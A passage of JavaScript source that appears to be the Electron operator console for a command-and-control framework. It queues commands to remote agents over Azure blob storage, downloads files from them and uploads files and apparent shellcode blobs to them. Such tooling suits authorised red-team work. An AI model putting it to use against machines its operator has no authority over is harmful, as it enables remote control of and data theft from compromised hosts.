const { app, BrowserWindow, ipcMain, Menu, clipboard, shell, screen, dialog, MenuItem, nativeTheme } = require('electron');
const fs   = require('fs');  
const path = require('path');
const az   = require('./azure');
const { getAppDataDir } = require('./common');
const directories = getAppDataDir();
global.config = require(directories.configFilePath);
const agents        = [];
global.removedAgents = [];
let win;
global.agentids           = [];
global.agentwindows       = 0;
global.agentWindowHandles = {}; // Store windows by agentID
global.dashboardWindow    = null;
global.agents             = [];
global.haltUpdate         = false;

// Task queue system
global.taskQueue = [];
global.isProcessingTask = false;

class Container 
{
  constructor(name, key = {}, blobs = {}) 
  {
    this.name = null || name;
    this.key = {} || key;
    this.blobs = {} || blobs;
  }
  setName(name) {
    this.name = name;
  }
  setKey(key) {
    this.key = {
      'key' : key.key,
      'iv' : key.iv
    };
  }
}

class Agent 
{
  constructor(agentId, containerObject) 
  {
    this.agentid   = null || agentId;
    this.container = null || containerObject;
    this.BrowserWindow = null;
  }
}

class Task {
    constructor(command) {
        this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
        this.command = command;
        this.taskid = Math.random().toString(36).substring(2, 14);
        this.status = 'starting';
    }
}

function createDashboardWindow() {
    // Force dark theme
    nativeTheme.themeSource = 'dark';
    
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width, height } = primaryDisplay.workAreaSize;
    
    global.dashboardWindow = new BrowserWindow({
        width: Math.floor(width * 0.76),
        height: Math.floor(height * 0.8),
        center: true,
        darkTheme: true,
        webPreferences: {
          contextIsolation: false,
          enableRemoteModule: true,
          nodeIntegration: true
        },
    });
    
    // Set dashboard-specific menu when window is focused
    global.dashboardWindow.on('focus', () => {
        setDashboardMenu();
    });
    
    global.dashboardWindow.focus();
    global.dashboardWindow.loadFile('dashboard.html');
    
    // Set dashboard menu immediately
    setDashboardMenu();
    
    console.log('Main window created');
}

async function createContainerWindow(thisagentid) {
    let exists = false;
    for (let i = 0; i < agents.length; i++) {
      if (agents[i].agentid === thisagentid)
      {
          console.log(`agent with agentid ${thisagentid} already exists in agents[${i}]`);
          exists = true;
      }
    }
    if (!exists)
    {
        const primaryDisplay = screen.getPrimaryDisplay();
        const { width, height } = primaryDisplay.workAreaSize;
        const containerWin = new BrowserWindow({
            width: Math.floor(width * 0.6),
            height: Math.floor(height * 0.7),
            center: true,
            darkTheme: true,
            webPreferences: {
              contextIsolation: false,
              enableRemoteModule: true,
              nodeIntegration: true
            },
        });
        let agent_object = global.agents.find(agent => agent.agentid === thisagentid);
        
        if (!agent_object) {
            console.error(`createContainerWindow: No agent found with ID ${thisagentid}`);
            console.log('Available agents:', global.agents.map(a => a.agentid));
            return;
        }
        
        console.log(`createContainerWindow: Found agent:`, agent_object.agentid, agent_object.hostname);
        global.agentWindowHandles[agent_object.agentid] = containerWin;
        global.agentwindows++;
        containerWin.loadFile('agent.html').then(() => {
            console.log(`createContainerWindow: Sending container-data for agent ${agent_object.agentid}`);
            containerWin.webContents.send('container-data', agent_object);
            
            // Load and apply saved settings to new agent window
            const customizePath = path.join(directories.configDir, 'customize.js');
            try {
                if (fs.existsSync(customizePath)) {
                    delete require.cache[require.resolve(customizePath)];
                    const savedSettings = require(customizePath);
                    console.log('Applying saved settings to new agent window:', savedSettings);
                    containerWin.webContents.send('apply-font-settings', savedSettings);
                }
            } catch (error) {
                console.error('Error loading settings for new agent window:', error);
            }
        });
        console.log(`Container window created for container: ${agent_object.container}`);
        console.log(`Number of agent windows : ${global.agentwindows}`);

        // Store the agent ID in the window object for menu handling
        containerWin.agentId = thisagentid;

        // Set agent-specific menu when window is focused
        containerWin.on('focus', () => {
            setAgentMenu();
        });

        containerWin.on('close', async (event) => {
            event.preventDefault(); 
            await containerWin.webContents.send('window-closing'); 
        });

    }
}

ipcMain.on('force-close', async (event, agentid) => {
    console.log(`kernel.js : IPC force-close`);
    console.log(`agentid   : ${agentid}`);
    const agentIndex = agents.findIndex(agent => agent.agentid === agentid);
    if (agentIndex !== -1) agents.splice(agentIndex, 1);

    const agentIdIndex = global.agentids.indexOf(agentid);
    if (agentIdIndex !== -1) {
        global.agentids.splice(agentIdIndex, 1);
    }

    const agentWindow = global.agentWindowHandles[agentid];
    if (agentWindow && !agentWindow.isDestroyed()) {
        agentWindow.destroy();
        delete global.agentWindowHandles[agentid];
        global.agentwindows = Math.max(0, global.agentwindows - 1);
    }
});

async function createExplorerWindow(thisagent) {
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width, height } = primaryDisplay.workAreaSize;
    const ExplorerWin = new BrowserWindow({
        width: Math.floor(width * 0.6),
        height: Math.floor(height * 0.7),
        center: true,
        darkTheme: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true, 
        },
    });
    let this_agent = JSON.parse(thisagent);
    let agent_object = global.agents.find(agent => agent.agentid === this_agent.agentid);
    ExplorerWin.loadFile('explorer.html').then(() => {
        ExplorerWin.webContents.send('container-data', agent_object);
    });
    ExplorerWin.on('close', async (event) => {
    });
}

function openDownloadsExplorer() {
    shell.openPath(directories.downloadsDir);
}

function openAgentLogsExplorer() {
    shell.openPath(directories.logDir);
}

function openConfigWindow() {
    const configWindow = new BrowserWindow({
        width: 500,
        height: 500,
        title: "Configuration",
        parent: win,
        modal: true,
        darkTheme: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true
        },
    });
    configWindow.loadFile('settings.html');
}

let agentSettingsWindows = new Map(); // Track settings windows per agent
let taskQueueWindows = new Map(); // Track task queue windows per agent
let dashboardSettingsWindow = null; // Track dashboard settings window

function setDashboardMenu() {
    const dashboardMenu = Menu.buildFromTemplate([
        {
            label: 'View',
            submenu: [
                {
                    label: 'Configuration',
                    click: () => {
                        openConfigWindow();
                    }
                },
                {
                    label: 'Downloads',
                    click: () => {
                        openDownloadsExplorer();
                    }
                },
                {
                    label: 'Agent Logs',
                    click: () => {
                        openAgentLogsExplorer();
                    }
                },
                {
                    type: 'separator'
                },
                {
                    label: 'Dashboard Settings',
                    click: () => {
                        openDashboardSettingsWindow();
                    }
                }
            ]
        },
        {
            label: 'Developer',
            submenu: [
                {
                    label: 'Toggle Developer Tools',
                    accelerator: 'CmdOrCtrl+Shift+I',
                    click: () => {
                        const focusedWindow = BrowserWindow.getFocusedWindow();
                        if (focusedWindow) {
                            focusedWindow.webContents.toggleDevTools();
                        }
                    }
                },
                {
                    label: 'Perform Command Test',
                    click: () => {
                        const focusedWindow = BrowserWindow.getFocusedWindow();
                        if (focusedWindow) {
                            focusedWindow.webContents.send('execute-test-command');
                        }
                    }
                },
                {
                    role: 'reload'
                }
            ]
        }
    ]);
    Menu.setApplicationMenu(dashboardMenu);
}

function setAgentMenu() {
    const agentMenu = Menu.buildFromTemplate([
        {
            label: 'View',
            submenu: [
                {
                    label: 'Configuration',
                    click: () => {
                        openConfigWindow();
                    }
                },
                {
                    label: 'Downloads',
                    click: () => {
                        openDownloadsExplorer();
                    }
                },
                {
                    label: 'Agent Logs',
                    click: () => {
                        openAgentLogsExplorer();
                    }
                },
                {
                    type: 'separator'
                },
                {
                    label: 'Task Queue',
                    click: () => {
                        const focusedWindow = BrowserWindow.getFocusedWindow();
                        if (focusedWindow && focusedWindow.agentId) {
                            console.log(`[TASK QUEUE] Menu item clicked for agent: ${focusedWindow.agentId}`);
                            openTaskQueueWindow(focusedWindow.agentId);
                        }
                    }
                },
                {
                    type: 'separator'
                },
                {
                    label: 'Agent Settings',
                    click: () => {
                        const focusedWindow = BrowserWindow.getFocusedWindow();
                        if (focusedWindow) {
                            console.log('Agent Settings clicked for agent window');
                            openAgentSettingsWindow(focusedWindow);
                        }
                    }
                }
            ]
        },
        {
            label: 'Developer',
            submenu: [
                {
                    label: 'Toggle Developer Tools',
                    accelerator: 'CmdOrCtrl+Shift+I',
                    click: () => {
                        const focusedWindow = BrowserWindow.getFocusedWindow();
                        if (focusedWindow) {
                            focusedWindow.webContents.toggleDevTools();
                        }
                    }
                },
                {
                    label: 'Perform Command Test',
                    click: () => {
                        const focusedWindow = BrowserWindow.getFocusedWindow();
                        if (focusedWindow) {
                            focusedWindow.webContents.send('execute-test-command');
                        }
                    }
                },
                {
                    role: 'reload'
                }
            ]
        }
    ]);
    Menu.setApplicationMenu(agentMenu);
}

function openTaskQueueWindow(agentId) {
    // Force dark mode for this window
    nativeTheme.themeSource = 'dark';
    console.log(`[TASK QUEUE] Opening task queue window for agent: ${agentId}`);
    
    // Check if task queue window already exists for this agent
    if (taskQueueWindows.has(agentId)) {
        const existingWindow = taskQueueWindows.get(agentId);
        if (existingWindow && !existingWindow.isDestroyed()) {
            console.log(`[TASK QUEUE] Focusing existing window for agent: ${agentId}`);
            existingWindow.focus();
            return;
        }
    }
    
    try {
        const taskQueueWindow = new BrowserWindow({
            width: 800,
            height: 600,
            title: `Task Queue - Agent ${agentId}`,
            center: true,
            resizable: true,
            darkTheme: true,
            webPreferences: {
                contextIsolation: false,
                enableRemoteModule: true,
                nodeIntegration: true
            },
        });
        
        console.log(`[TASK QUEUE] Created window for agent: ${agentId}`);
        
        taskQueueWindow.loadFile('task-queue.html').then(() => {
            console.log(`[TASK QUEUE] Loaded task-queue.html for agent: ${agentId}`);
        }).catch((error) => {
            console.error(`[TASK QUEUE] Error loading task-queue.html: ${error}`);
        });
        
        // Store reference
        taskQueueWindows.set(agentId, taskQueueWindow);
        
        // Clean up reference when window is closed
        taskQueueWindow.on('closed', () => {
            console.log(`[TASK QUEUE] Window closed for agent: ${agentId}`);
            taskQueueWindows.delete(agentId);
        });
        
        // Store agent ID for IPC communication
        taskQueueWindow.agentId = agentId;
        
        // Send agent data when window loads
        taskQueueWindow.webContents.on('did-finish-load', () => {
            console.log(`[TASK QUEUE] Window finished loading for agent: ${agentId}`);
            const agent = global.agents.find(agent => agent.agentid === agentId);
            if (agent) {
                console.log(`[TASK QUEUE] Sending agent data for: ${agentId}`);
                taskQueueWindow.webContents.send('agent-data', agent);
            } else {
                console.log(`[TASK QUEUE] No agent found with ID: ${agentId}`);
            }
        });
        
    } catch (error) {
        console.error(`[TASK QUEUE] Error creating window for agent ${agentId}: ${error}`);
    }
}

function openAgentSettingsWindow(parentWindow) {
    // Check if settings window already exists for this parent
    if (agentSettingsWindows.has(parentWindow)) {
        const existingWindow = agentSettingsWindows.get(parentWindow);
        if (existingWindow && !existingWindow.isDestroyed()) {
            existingWindow.focus();
            return;
        }
    }
    
    const settingsWindow = new BrowserWindow({
        width: 550,
        height: 800,
        title: "Agent Settings",
        parent: parentWindow,
        modal: false,
        center: true,
        resizable: true,
        darkTheme: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true
        },
    });
    
    settingsWindow.loadFile('agent-settings.html');
    
    // Store reference
    agentSettingsWindows.set(parentWindow, settingsWindow);
    
    // Clean up reference when window is closed
    settingsWindow.on('closed', () => {
        agentSettingsWindows.delete(parentWindow);
    });
    
    // Store parent reference for IPC communication
    settingsWindow.parentAgentWindow = parentWindow;
}

function openDashboardSettingsWindow() {
    // Check if settings window already exists
    if (dashboardSettingsWindow && !dashboardSettingsWindow.isDestroyed()) {
        dashboardSettingsWindow.focus();
        return;
    }
    
    dashboardSettingsWindow = new BrowserWindow({
        width: 550,
        height: 360,
        title: "Dashboard Settings",
        parent: global.dashboardWindow,
        modal: false,
        center: true,
        resizable: true,
        darkTheme: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true
        },
    });
    
    dashboardSettingsWindow.loadFile('dashboard-settings.html');
    
    // Clean up reference when window is closed
    dashboardSettingsWindow.on('closed', () => {
        dashboardSettingsWindow = null;
    });
}

// IPC handler for selecting background image
ipcMain.handle('select-background-image', async () => {
    const result = await dialog.showOpenDialog({
        title: 'Select Background Image',
        filters: [
            { name: 'Images', extensions: ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'] },
            { name: 'All Files', extensions: ['*'] }
        ],
        properties: ['openFile']
    });
    
    if (!result.canceled && result.filePaths.length > 0) {
        return result.filePaths[0];
    }
    
    return null;
});

// IPC handler for applying agent settings
ipcMain.on('apply-agent-settings', (event, settings) => {
    console.log('=== RECEIVED APPLY-AGENT-SETTINGS IPC ===');
    console.log('Settings received:', settings);
    
    // Save settings to customize.js file
    const customizePath = path.join(directories.configDir, 'customize.js');
    console.log('Saving to customize path:', customizePath);
    
    // Load existing settings to preserve backgroundImage
    let existingSettings = {};
    try {
        if (fs.existsSync(customizePath)) {
            delete require.cache[require.resolve(customizePath)];
            existingSettings = require(customizePath);
        }
    } catch (error) {
        console.error('Error loading existing settings for merge:', error);
    }
    
    const customizeConfig = {
        fontFamily: settings.fontFamily,
        fontSize: settings.fontSize,
        fontColor: settings.fontColor,
        zoom: settings.zoom,
        backgroundImage: existingSettings.backgroundImage || null, // Preserve existing dashboard background image
        agentBackgroundImage: settings.agentBackgroundImage,
        historyLength: settings.historyLength !== undefined ? settings.historyLength : 100,
        lastUpdated: new Date().toISOString(),
        version: "1.0.0"
    };
    
    try {
        fs.writeFileSync(customizePath, `module.exports = ${JSON.stringify(customizeConfig, null, 4)};`);
        console.log('Customize settings saved successfully');
    } catch (error) {
        console.error('Error saving customize settings:', error);
    }
    
    // Find the settings window that sent this message
    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
    console.log('Settings window found:', !!settingsWindow);
    
    const parentWindow = settingsWindow ? settingsWindow.parentAgentWindow : null;
    console.log('Parent window found:', !!parentWindow);
    console.log('Parent window destroyed?', parentWindow ? parentWindow.isDestroyed() : 'N/A');
    
    if (parentWindow && !parentWindow.isDestroyed()) {
        console.log('Sending apply-font-settings to parent window...');
        // Send settings to the parent agent window
        parentWindow.webContents.send('apply-font-settings', settings);
        console.log('apply-font-settings IPC sent to parent');
    } else {
        console.error('Parent window not available or destroyed');
        
        // Fallback: try to apply to all agent windows
        console.log('Fallback: applying to all agent windows');
        Object.values(global.agentWindowHandles || {}).forEach((window, index) => {
            if (window && !window.isDestroyed()) {
                console.log(`Sending to agent window ${index}`);
                window.webContents.send('apply-font-settings', settings);
            }
        });
    }

    // Also send settings to dashboard window for background image
    if (global.dashboardWindow && !global.dashboardWindow.isDestroyed()) {
        console.log('Sending apply-font-settings to dashboard window...');
        global.dashboardWindow.webContents.send('apply-font-settings', settings);
        console.log('apply-font-settings IPC sent to dashboard');
    }
});

// IPC handler for reading customize settings
ipcMain.handle('get-customize-settings', () => {
    const customizePath = path.join(directories.configDir, 'customize.js');
    console.log('Looking for customize.js at:', customizePath);
    
    try {
        // Check if customize.js exists, if not create it with defaults
        if (!fs.existsSync(customizePath)) {
            console.log('Creating new customize.js file...');
            const defaultConfig = {
                fontFamily: "'Fira Code', monospace",
                fontSize: 16,
                fontColor: "#c5c5c5",
                zoom: 1.0,
                backgroundImage: null,
                agentBackgroundImage: null,
                historyLength: 100,
                lastUpdated: new Date().toISOString(),
                version: "1.0.0"
            };
            fs.writeFileSync(customizePath, `module.exports = ${JSON.stringify(defaultConfig, null, 4)};`);
            console.log('Created default customize.js file at:', customizePath);
        }
        
        // Clear require cache to get fresh data
        delete require.cache[require.resolve(customizePath)];
        const customizeConfig = require(customizePath);
        console.log('Loaded customize settings:', customizeConfig);
        return customizeConfig;
    } catch (error) {
        console.error('Error loading customize settings:', error);
        // Return defaults if file can't be read
        return {
            fontFamily: "'Fira Code', monospace",
            fontSize: 16,
            fontColor: "#c5c5c5",
            zoom: 1.0,
            backgroundImage: null,
            agentBackgroundImage: null,
            historyLength: 100
        };
    }
});

// IPC handler for closing agent settings window
ipcMain.on('close-agent-settings-window', (event) => {
    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
    if (settingsWindow && !settingsWindow.isDestroyed()) {
        settingsWindow.close();
    }
});

// IPC handler for reloading agent history with new length setting
ipcMain.on('reload-agent-history', (event, historyLength) => {
    console.log('=== RECEIVED RELOAD-AGENT-HISTORY IPC ===');
    console.log('History length:', historyLength);
    
    // Find the settings window that sent this message
    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
    const parentWindow = settingsWindow ? settingsWindow.parentAgentWindow : null;
    
    if (parentWindow && !parentWindow.isDestroyed()) {
        console.log('Sending reload-history to parent agent window...');
        parentWindow.webContents.send('reload-history', historyLength);
        console.log('reload-history IPC sent to parent');
    } else {
        console.error('Parent window not available for history reload');
    }
});

// IPC handler for applying dashboard settings
ipcMain.on('apply-dashboard-settings', (event, settings) => {
    console.log('=== RECEIVED APPLY-DASHBOARD-SETTINGS IPC ===');
    console.log('Dashboard settings received:', settings);
    
    // Load existing settings and merge with dashboard-specific settings
    const customizePath = path.join(directories.configDir, 'customize.js');
    let existingSettings = {};
    
    try {
        if (fs.existsSync(customizePath)) {
            delete require.cache[require.resolve(customizePath)];
            existingSettings = require(customizePath);
        }
    } catch (error) {
        console.error('Error loading existing settings:', error);
    }
    
    // Merge dashboard settings with existing settings
    const customizeConfig = {
        ...existingSettings,
        backgroundImage: settings.backgroundImage,
        lastUpdated: new Date().toISOString(),
        version: "1.0.0"
    };
    
    try {
        fs.writeFileSync(customizePath, `module.exports = ${JSON.stringify(customizeConfig, null, 4)};`);
        console.log('Dashboard settings saved successfully');
    } catch (error) {
        console.error('Error saving dashboard settings:', error);
    }
    
    // Apply background image to dashboard window immediately
    if (global.dashboardWindow && !global.dashboardWindow.isDestroyed()) {
        console.log('Sending apply-font-settings to dashboard window...');
        global.dashboardWindow.webContents.send('apply-font-settings', customizeConfig);
        console.log('apply-font-settings IPC sent to dashboard');
    }
});

// IPC handler for closing dashboard settings window
ipcMain.on('close-dashboard-settings-window', (event) => {
    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
    if (settingsWindow && !settingsWindow.isDestroyed()) {
        settingsWindow.close();
    }
});

// IPC handlers for task queue operations
ipcMain.handle('get-agent-tasks', (event, agentId) => {
    const agent = global.agents.find(agent => agent.agentid === agentId);
    return agent ? agent.tasks || [] : [];
});

ipcMain.handle('remove-task', (event, agentId, taskId) => {
    try {
        const agent = global.agents.find(agent => agent.agentid === agentId);
        if (agent && agent.tasks) {
            const taskIndex = agent.tasks.findIndex(task => task.taskid === taskId);
            if (taskIndex !== -1) {
                // Don't remove tasks that are currently processing
                if (agent.tasks[taskIndex].status === 'processing') {
                    return { success: false, message: 'Cannot remove task that is currently processing' };
                }
                agent.tasks.splice(taskIndex, 1);
                console.log(`[TASK QUEUE] Removed task ${taskId} from agent ${agentId}`);
                
                // Notify all task queue windows for this agent
                if (taskQueueWindows.has(agentId)) {
                    const window = taskQueueWindows.get(agentId);
                    if (window && !window.isDestroyed()) {
                        window.webContents.send('task-removed', taskId);
                    }
                }
                
                return { success: true };
            }
        }
        return { success: false, message: 'Task not found' };
    } catch (error) {
        console.error('Error removing task:', error);
        return { success: false, message: error.message };
    }
});

ipcMain.handle('modify-task', (event, agentId, taskId, newCommand) => {
    try {
        const agent = global.agents.find(agent => agent.agentid === agentId);
        if (agent && agent.tasks) {
            const task = agent.tasks.find(task => task.taskid === taskId);
            if (task) {
                // Don't modify tasks that are currently processing
                if (task.status === 'processing') {
                    return { success: false, message: 'Cannot modify task that is currently processing' };
                }
                task.command = newCommand;
                console.log(`[TASK QUEUE] Modified task ${taskId} for agent ${agentId}: ${newCommand}`);
                
                // Notify all task queue windows for this agent
                if (taskQueueWindows.has(agentId)) {
                    const window = taskQueueWindows.get(agentId);
                    if (window && !window.isDestroyed()) {
                        window.webContents.send('task-modified', task);
                    }
                }
                
                return { success: true };
            }
        }
        return { success: false, message: 'Task not found' };
    } catch (error) {
        console.error('Error modifying task:', error);
        return { success: false, message: error.message };
    }
});

ipcMain.handle('reorder-task', (event, agentId, taskId, direction) => {
    try {
        const agent = global.agents.find(agent => agent.agentid === agentId);
        if (agent && agent.tasks) {
            const taskIndex = agent.tasks.findIndex(task => task.taskid === taskId);
            if (taskIndex !== -1) {
                const task = agent.tasks[taskIndex];
                
                // Don't move tasks that are processing
                if (task.status === 'processing') {
                    return { success: false, message: 'Cannot reorder task that is currently processing' };
                }
                
                let newIndex = taskIndex;
                if (direction === 'up' && taskIndex > 0) {
                    newIndex = taskIndex - 1;
                } else if (direction === 'down' && taskIndex < agent.tasks.length - 1) {
                    newIndex = taskIndex + 1;
                } else {
                    return { success: false, message: 'Cannot move task in that direction' };
                }
                
                // Remove task from current position and insert at new position
                agent.tasks.splice(taskIndex, 1);
                agent.tasks.splice(newIndex, 0, task);
                
                console.log(`[TASK QUEUE] Moved task ${taskId} ${direction} for agent ${agentId}`);
                
                // Notify all task queue windows for this agent
                if (taskQueueWindows.has(agentId)) {
                    const window = taskQueueWindows.get(agentId);
                    if (window && !window.isDestroyed()) {
                        window.webContents.send('tasks-reordered', agent.tasks);
                    }
                }
                
                return { success: true };
            }
        }
        return { success: false, message: 'Task not found' };
    } catch (error) {
        console.error('Error reordering task:', error);
        return { success: false, message: error.message };
    }
});

ipcMain.handle('updateagent', async (event, agentid,newcontainerid) => {
    try
    {
        const newcontainer_blobs = await az.getContainerBlobs(newcontainerid);
        console.log(`${newcontainerid} container key blob : ${newcontainer_blobs['key']}`);
        let container_key,links  = await az.getContainerAesKeys(agentid);
        let checkinData          = await az.checkinContainer(newcontainerid, container_key,newcontainer_blobs);
        let agentObj             = JSON.parse(checkinData);
        agentObj.agentid         = agentid;
        agentObj.containerid     = newcontainerid;
        agentObj.key             = container_key['key'];
        agentObj.iv              = container_key['iv'];
        let startupdata          = JSON.stringify(agentObj);
        for (let i = 0; i < agents.length; i++) {
            if (agents[i].agentid === agentid)
            {
                JSON.stringify(agents[i]);
                agents[i].container.name = newcontainerid;
                agents[i].BrowserWindow.webContents.send('container-data', newcontainerid, container_key, newcontainer_blobs,startupdata);
                break;
            }
        }
    }catch(error)
    {
        console.log(`updateagent IPC kernel.js error : ${error} ${error.stack}`);
    }
});

ipcMain.on('upload-client-command-to-input-channel', async (event, agent_object) => {
    try {
        console.log(`kernel.js :  IPC "upload-client-command-to-input-channel`);
        let global_agent_object = global.agents.find(agent => agent.agentid === agent_object.agentid);
        let agent_task          = agent_object.tasks[agent_object.tasks.length - 1];
        
        // Set task status to queued and add to the global agent's task list
        agent_task.status = 'queued';
        
        // Initialize tasks array if it doesn't exist
        if (!global_agent_object.tasks) {
            global_agent_object.tasks = [];
        }
        
        global_agent_object.tasks.push(agent_task);
        
        console.log(`[TASK QUEUE] Task ${agent_task.taskid} added to queue for agent ${agent_object.agentid}`);
        
        // The task will be processed by the task queue processor
        // No immediate response is sent - the queue processor will send the response when complete
    } catch (error) {
        console.error('Error adding task to queue:', error);
        event.reply('command-output', `Error: ${error.message}`);
    }
});

ipcMain.handle('get-agent-links', async (event, agentid) => {
    try {
        console.log(`[KERNEL][IPC] get-agent-links : ${agentid}`);
        if(agentid == 0 || agentid == null || agentid == undefined || agentid == '')
        {
            return 0;
        }
        const [aesKeys, links] = await az.getContainerAesKeys(agentid);
        const agentlinks = links;
        console.log(`[KERNEL][IPC] get-agent-links : ${agentlinks}`);
        return agentlinks;
    } catch (error) {
      console.error('Error getting agent links:', error);
      return 0;
    }
});

ipcMain.on('pull-download-file', async (event, agent_object, filename, blob) => {
    try {
        if (filename.startsWith("'") && filename.endsWith("'")) {
            filename = filename.slice(1, -1);
        }
        if (filename.startsWith('"') && filename.endsWith('"')) {
            filename = filename.slice(1, -1);
        }
        await az.pullDownloadFile(agent_object,filename,blob);
    } catch (error) {
      console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.on('upload-file-to-blob', async (event, agent_object, uploadfile, uploadblob) => {
    try {
        await az.uploadFileToAzure(agent_object, uploadblob, uploadfile);
        await global.agentWindowHandles[agent_object.agentid].webContents.send('send-upload-command', agent_object);
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.on('upload-sc-to-blob', async (event, agent_object, scfile, scblob) => {
    try {
        console.log(`[KERNEL][IPC] upload-sc-to-blob : ${scfile} ${scblob}`);
        await az.uploadSCToAzure(agent_object, scblob, scfile);
        await global.agentWindowHandles[agent_object.agentid].webContents.send('send-upload-command', agent_object);
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.handle('preload-agents', async () => {
    let blobs = await az.preloadContainers();
    return blobs;
});

ipcMain.handle('get-containers', async () => {
    // console.log(`[KENEL][IPC] get-containers : ${global.removedAgents}`);
    // console.log(`[KENEL][IPC] global.haltUpdate : ${global.haltUpdate}`);
    if (global.haltUpdate == false)
    {
        let blobs = await az.updateDashboardTable();
        if (global.removedAgents.length > 0)
        {
            for (let i = 0; i < global.removedAgents.length; i++)
            {
                blobs.removedAgents = global.removedAgents[i];
                console.log(`[KENEL][IPC] global.removedAgents[${i}] : ${global.removedAgents[i]}`);
            }
        }
        return blobs;
    }
    else
    {
        return 0;
    }
});

ipcMain.handle('get-agent-checkin', async (event, agentid) => {
    if (global.haltUpdate == false)
    {
        let thisAgent = global.agents.find(agent => agent.agentid === agentid); 
        let agentCheckin = await az.returnAgentCheckinInfo(thisAgent.agentid);
        thisAgent.checkin = agentCheckin;
        return JSON.stringify(thisAgent);
    }
    else { return 0; }
});

ipcMain.on('open-container-window', async (event, thisagentid) => {
    console.log(`IPC Open Container Window : ${thisagentid}`);
    let window_exists = false;
    if (global.agentwindows === 0) { global.agentids.length = 0; }
    console.log(`agentids[] : ${thisagentid}`);
    if (!global.agentids.includes(thisagentid)) {
      global.agentids.push(thisagentid);
        console.log(`${thisagentid} added to the array.`);
    } else {
        console.log(`${thisagentid} already exists.`);
        window_exists = true;
    }
    const agentWindow = global.agentWindowHandles[thisagentid];
    if (global.agentWindowHandles[thisagentid] !== undefined) 
    {
        window_exists = true;
        console.log(`window exists`);
        if (agentWindow && !agentWindow.isDestroyed()) {
            agentWindow.focus(); 
            return;
        }
    }
    if (window_exists == false)
    {
        setTimeout(() => { createContainerWindow(thisagentid) }, 1000); 
    }
});

ipcMain.on('execute-command', (event, command) => {
    console.log(`Executing command: ${command}`);
    const result = `Executed command: ${command}`;
    event.sender.send('command-result', result);
});

app.whenReady().then(() => {
    console.log('App is ready');
    createDashboardWindow();
    
    // Start the task queue processor
    startTaskQueue();
    
    // Set initial dashboard menu
    setDashboardMenu();
// Handle right-click context menu for table rows
ipcMain.on('show-row-context-menu', (event, agentsDataJSON) => {
        let agentsData = JSON.parse(agentsDataJSON);
        console.log(`[RIGHT-CLICK] agentsData : ${JSON.stringify(agentsData)}`);
        const agentid = agentsData[0].agentid;
        const contextMenu = Menu.buildFromTemplate([
            {
                label: 'Remove',
                click: async () => {
                    try {
                        global.haltUpdate = true;
                        global.removedAgents.push(agentid);
                        // Handle agent window cleanup
                        if (global.agentWindowHandles[agentid]) {
                            try {
                                console.log(`Closing window for agent ID: ${agentid}`);
                                global.agentWindowHandles[agentid].destroy();
                                delete global.agentWindowHandles[agentid];
                                
                                for (let i = 0; i < agents.length; i++) {
                                    if (agents[i].agentid === agentid) {
                                        agents.splice(i, 1);
                                        break;
                                    }
                                }
                                const agentIdIndex = global.agentids.indexOf(agentid);
                                if (agentIdIndex !== -1) global.agentids.splice(agentIdIndex, 1);
                                global.agentwindows--;
                            } catch (windowError) {
                                console.log(`Error cleaning up agent window: ${windowError} ${windowError.stack}`);
                                global.haltUpdate = false;
                                return;
                            }
                        }

                        // Handle dashboard updates
                        if (global.dashboardWindow) {
                            try {
                                console.log(`dashboardWindow exists`);
                                console.log(`calling IPC remove-table row for ${agentid} agent`);
                                global.dashboardWindow.webContents.send('remove-table-row', agentid);
                            } catch (dashboardError) {
                                console.log(`[REMOVE][!] Error updating dashboard: \r\n${dashboardError}\r\n${dashboardError.stack}`);
                                global.haltUpdate = false;
                                return;
                            }
                        }
                        // Handle storage cleanup
                        try {
                            await az.DeleteStorageBlob(global.config.metaContainer, agentid);
                            await az.DeleteStorageContainer(agentsData[0].containerid);
                            
                            if (global.dashboardWindow) {
                                console.log(`dashboardWindow exists`);
                                console.log(`calling IPC remove-table row for ${agentid} agent`);
                                global.dashboardWindow.webContents.send('remove-table-row', agentid);
                            }
                        } catch (storageError) {
                            console.log(`[REMOVE][!] Error cleaning up storage: \r\n${storageError}\r\n${storageError.stack}`);
                            global.haltUpdate = false;
                            return;
                        }
                        global.haltUpdate = false;
                    } catch (error) {
                        console.log(`[REMOVE][!] Unexpected error in remove operation: \r\n${error}\r\n${error.stack}`);
                        global.haltUpdate = false;
                    }
                }
            },
            {
                label: 'Explorer',
                click: () => {
                    console.log(`Explorer clicked for agent ID: ${agentid}`);
                    createExplorerWindow(JSON.stringify(agentsData[0]));
                }
            },
            {
                label: 'Links',
                visible: agentsData[0].mode && agentsData[0].mode.startsWith('link'),
                click: () => {
                    console.log(`Links clicked for agent ID: ${agentid}`);
                    const primaryDisplay = screen.getPrimaryDisplay();
                    const { width: screenWidth, height: screenHeight } = primaryDisplay.workAreaSize;
                    console.log(`Screen dimensions - Width: ${screenWidth}, Height: ${screenHeight}`);
                    
                    // Calculate window dimensions
                    const numAgents = agentsData.length + 1; // Add 1 for the Azure storage card
                    const headerHeight = 150;  // Height for window title bar and header
                    const heightPerAgent = 528;  // Height per agent card
                    const arrowSpacing = 10;  // Space between arrow and next card
                    const calculatedHeight = headerHeight + (numAgents * heightPerAgent) + ((numAgents - 1) * arrowSpacing);
                    const maxHeight = Math.floor(screenHeight * 0.9);
                    console.log(`Calculated height: ${calculatedHeight}, Max height: ${maxHeight}`);
                    
                    const totalHeight = Math.min(calculatedHeight, maxHeight);
                    const width = Math.min(
                        Math.max(600, screenWidth * 0.6),
                        800
                    );
                    
                    const linksWindow = new BrowserWindow({
                        width: width,
                        height: totalHeight,
                        minWidth: 600,
                        minHeight: 400,
                        webPreferences: {
                            contextIsolation: false,
